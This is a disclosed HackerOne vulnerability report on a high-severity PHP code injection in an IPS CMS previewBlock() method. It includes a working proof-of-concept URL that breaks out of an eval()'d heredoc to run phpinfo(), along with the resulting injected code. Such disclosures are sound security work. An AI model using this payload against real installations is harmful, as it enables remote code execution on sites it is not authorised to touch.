# PHP Code Injection through "previewBlock()" method

## Report Details
- **Report ID**: 1092574
- **URL**: https://hackerone.com/reports/1092574
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-02-02T00:04:38.493Z
- **Disclosed**: 2021-05-28T16:50:01.312Z

## Reporter
- **Username**: egix
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ips

## Vulnerability Information
**Summary:**
The vulnerability exists because the `IPS\cms\modules\front\pages\_builder::previewBlock()` method allows to pass arbitrary content to the `IPS\_Theme::runProcessFunction()` method, which will be used in a call to the `eval()` function. This can be exploited to inject and execute arbitrary PHP code.

**Steps To Reproduce:**

- Login as an user with permission to manage the sidebar 
- Browse to the following URL:

```
http://[host]/[ips]/index.php?app=cms&module=pages&controller=builder&do=previewBlock&block_plugin=stats&block_template_use_how=copy&block_plugin_app=core&_sending=block_content&block_content=RCE%0ACONTENT;}}phpinfo();die;/*
```

- This will result in the following PHP code to be passed to the `eval()` function from the `IPS\_Theme::runProcessFunction()` method:

```
namespace IPS\Theme;
class class_content_template_for_block_
{
	function run(  ) {
		$return = '';
		$return .= <<<CONTENT

RCE
CONTENT;}}phpinfo();die;/*
CONTENT;

		return $return;
}}
```

- As a result, the `phpinfo()` function will be executed

## Impact

A malicious user might be able to inject and execute arbitrary PHP code. Successful exploitation of this vulnerability requires an account with permission to manage the sidebar (such as a Moderator or Administrator) and the "cms" application to be enabled.

## Attachments
No attachments
